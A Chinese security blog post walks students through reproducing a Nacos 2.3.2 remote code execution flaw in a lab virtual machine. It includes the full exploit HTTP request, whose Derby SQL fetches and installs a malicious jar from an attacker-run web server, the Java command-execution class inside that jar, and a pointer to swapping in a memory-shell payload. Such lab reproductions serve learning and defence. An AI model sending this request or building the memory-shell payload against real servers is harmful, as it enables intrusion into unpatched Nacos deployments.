#  nacos的1day保姆级漏洞复现   
湘南第一深情  湘安无事   2024-07-16 20:06  
  
**声明：**  
**由于传播、利用本公众号湘安无事所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！本文来自内部学员的分享报告。**  
  
文章内容  
  
  
  
  
1.昨天不是爆了nacos的rce,然后当天晚上带着学员一起再哪里研究复现，先把poc下载下来  
```
https://github.com/alibaba/nacos/releases/tag/2.3.2
```  
  
2.然后搭建  
nacos的  
2.3.2的靶场，github的上面有，后台回复nacos也可以  
```
https://github.com/alibaba/nacos/releases/tag/2.3.2
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZODHONOdlkiaA0qiczMVeUQcI1lT7CCJVDR20ic7GHwNt31YKBjjRtJxQ7Q/640?wx_fmt=png&from=appmsg "")  
  
  
3.然后直接搭建nacos的环境，这里就很有意思了，我们先执行搭建命令  
```
startup.cmd -m standalone
```  
  
4.你猜怎么的，我直接就成功了，但是学员没有一个人成功。笑死了果然每个人的电脑体质不一样，成功就直接访问出现的url路径就行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZO3822hMTniafGjIdYtdn3v6uRf5BCB86ucy6r2ANgjuraBZOofrp2wGQ/640?wx_fmt=png&from=appmsg "")  
  
5.学员不成功了那只能拷打我了，当天一起复现这个漏洞到晚上11.00多差不多3个小时真的裂开，不过还是学到一些东西的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOnHuyICkKSM3vyOCKne4FCcdR4HNF2lHFWicmVRoqib7dmWuujwzPUZUQ/640?wx_fmt=png&from=appmsg "")  
  
6.最后解决办法就是，拉个干净的虚拟机就可以直接搭建了，然后就搭建成功了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOjWVELWNJIB0iceMF2lWcYBV0g76JdFjTo3AIfVT95tZ9JCjdlkxiamCw/640?wx_fmt=png&from=appmsg "")  
  
7.然后开始跟着学员一起研究为什么会rce,不急，我们先复现一下漏洞。然后把poc里面的config.py改成本机的局域网ip和没有被占用的端口，这里是为了起个web服务让nacos去请求这个web服务里面的内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOQ3vas41FrUbicMYJ2f9kwUoyWNib5ribLQMUOBibuwEYnFWMICfgShyo2A/640?wx_fmt=png&from=appmsg "")  
  
8.然后直接运行命令python .\service.py 启动web服务，记住安装  
fl  
ask和  
requests的py模块  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOhxEG0AwmKuD8HvHVBiaXd1htYeibBuWLlR7uABGPvGtz8R3ic0sstb1fA/640?wx_fmt=png&from=appmsg "")  
  
9.启动成功后，再运行一下python exploit.py就可以弹calc了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZO7Ullj0ceAIxxOWZWtueqmpVpdAV5NGqMianxDNOVjnU2ntgZee9XTqA/640?wx_fmt=png&from=appmsg "")  
  
10.然后你会发现再弹calc计算器的时候，会去请求service.py起的web服务./download  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOTfmhoNicJ45Z8my6Gb1yEBDEcm9iaRqEOrN9pSqft9JzZOJRO7ibnqU8A/640?wx_fmt=png&from=appmsg "")  
  
11.然后我们去看一下这个  
service.py的内容，这里面写了个file.bin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOd2gtRwwCT2czch6JmUXMZdGdYdHvBibpxSqBMTJn7sCl2sicosf1m1Ow/640?wx_fmt=png&from=appmsg "")  
  
12.看不懂是把，没有关系，我们先看  
exploit.py干了啥，再  
exploit.py里面加个代理，然后查看  
数据包如下：  
```
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: host
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 488
Content-Type: multipart/form-data; boundary=111111111111111111111111

--11111111111111111111111111111
Content-Disposition: form-data; name="file"; filename="file"

CALL sqlj.install_jar('http://192.168.197.56:8000/download', 'NACOS.aKjwPoiU', 0)

        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.aKjwPoiU')

        CREATE FUNCTION S_EXAMPLE_aKjwPoiU( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'

--111111111111111111111111111111--
```  
  
显而易见了漏洞原理应该是sql导致的，去请求  
/download的内容，然后安装并执行恶意的jar文件，可以直接访问  
ht  
tp://192.168.197.56:8000  
/downloa  
d然后直接保存为1.jar，反编译打开就可以看到内容了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOTTCDauBXPAf58excj1G4iaUNtibibreyuWTZlLRDcYrIuiaI3iaI7icAO9nA/640?wx_fmt=png&from=appmsg "")  
  
看不懂没关系，我们直接扣下来再idea运行就行，发现直接弹calc的，所以就是加载了执行命令的jar.具体细节没研究了，但是能挖出这种漏洞的大佬肯定是对数据库和nacos的特性很了解才能挖出来的,只能说nb  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Addoil.png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOCYwej9KjBKcD7qmsticWicZyG2uzhJByzuTKFWuqiad9Oic2gktM6icfN8w/640?wx_fmt=png&from=appmsg "")  
```
public class Example {
    public static void main(String[] args) {
        String ret = exec("ipconfig");
        System.out.println(ret);
    }

    public static String exec(String cmd) {
        StringBuffer bf = new StringBuffer();
        try {
            String charset = "utf-8";
            String osName = System.getProperty("os.name");
            if (osName != null && osName.startsWith("Windows")) {
                charset = "gbk";
            }
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis, charset);
            BufferedReader br = new BufferedReader(isr);
            while (true) {
                String line = br.readLine();
                if (line == null) {
                    return bf.toString();
                }
                bf.append(line);
            }
        } catch (Exception e) {
            StringWriter writer = new StringWriter();
            PrintWriter printer = new PrintWriter(writer);
            e.printStackTrace(printer);
            try {
                writer.close();
                printer.close();
            } catch (IOException e2) {
            }
            return "ERROR:" + writer.toString();
        }
    }
}

```  
  
13.所以要打入内存马，肯定是要生成一个jar，然后转换成base64的bin,填入  
service.py里面的payload值就行，那天就是这样子给学员和成员讲的，好了下机，不会复现联系带头大哥。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZOunibxHBEia9ox3yXHZJ0sUanbbLyM3bZVp4aaYLLo4pwsCwJgmCib8fQQ/640?wx_fmt=png&from=appmsg "")  
  
  
正文结束  
  
  
  
  
本文  
由带头大哥  
投稿而成  
  
湘安无事团队介绍  
  
  
  
  
我们湘安无事团队长期专注于教育漏洞平台，积累了丰富的经验和深厚的专业知识。目前取得的成绩有edu-src平台团队第二名，漏洞盒子团队排行榜第二名，带领很多同学和学员挖到了证书或者赏金漏洞，后面会收集并上传到纷传，也欢迎各位同学加入edu团队与深情的带头大哥或者成员交流。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYvoDJnlu0CCyHWM4FUtViaN0qibwQh0dS2k0mp1qSxPYia15VNHJiarYuvUXWPHPiaicdfU106Zic1nyepNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYvoDJnlu0CCyHWM4FUtViaN0HO37mA0F2chFGiaRtyhTEllEMbTxbVycYS4fCtCHc8iaQsoMicSs6kjgQ/640?wx_fmt=png&from=appmsg "")  
  
纷传地址：已加过星球的联系深情的带头大哥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYuOGGmuWexUehbbpZVL8AZObribF8FJTRyJdTnDaKIl8M6QTicucqicoS99KKy0KxicVSGwibVJFZP6zGw/640?wx_fmt=png&from=appmsg "")  
  
  
技术交流群  
  
  
  
  
  
**微信群请加下放wx**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn5oa6HoP95IWOj6v84icE1zbvPeIHjrXgaX9sOBCk28uHUE2lr94mDw8jJsJtETiaiaKQLZeUYHRWtkQ/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYv1KmnvWg4F1cV2OEkHgCiaSarbNcICEdMPsZYTIRJtmy2Pjv6w0s0xaNHQSSu02Z3nLwLiaVGgJ4YQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYv1KmnvWg4F1cV2OEkHgCiaSkQRuwribQ48rALeT45mfc5x9wMEw6YmGEhJTiaa2opwBBcZT7vjicssHA/640?wx_fmt=png&from=appmsg "")  
  
  
